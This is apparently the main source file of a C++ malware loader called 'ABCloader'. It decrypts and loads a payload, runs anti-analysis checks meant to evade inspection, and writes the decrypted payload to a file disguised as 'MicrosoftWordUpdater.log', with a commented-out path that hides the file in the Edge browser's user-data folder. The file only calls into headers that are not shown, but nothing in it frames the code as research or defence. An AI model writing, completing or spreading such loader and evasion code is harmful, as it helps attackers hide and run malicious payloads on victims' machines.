#include "ABCloader.h"
#include "AntiAnalysis.h"
#include "Encryption.h"  // Make sure to include this
#include <iostream>

int main() {
    // Initialize the loader to decrypt and load the payload
    ABCloader loader;
    std::cout << "[*] Running ABCloader..." << std::endl;
    loader.runLoader();

    // Start anti-analysis techniques
    AntiAnalysis antiAnalysis;
    std::cout << "[*] Running anti-analysis techniques..." << std::endl;
    if (!antiAnalysis.runAntiAnalysis()) {
        std::cerr << "[!] Anti-analysis failed! Exiting." << std::endl;
        return 1;
    }

    // Decrypt and write the payload to a specific location
    Encryption encryption;  // Ensure encryption object is declared
    std::string outputPath = "C:\\Users\\johnj\\Documents\\MicrosoftWordUpdater.log";
    //std::string outputPath = "C:\\Users\\AppData\\Local\\Microsoft\\Edge\\User Data\\Synchronize\\MicrosoftWordUpdater.log";
    std::cout << "[*] Decrypting and writing data..." << std::endl;
    if (!encryption.decryptDataAndWrite(outputPath)) {
        std::cerr << "[!] Failed to write decrypted payload!" << std::endl;
        return 1;
    }

    std::cout << "[*] Completed execution." << std::endl;
    return 0;
}
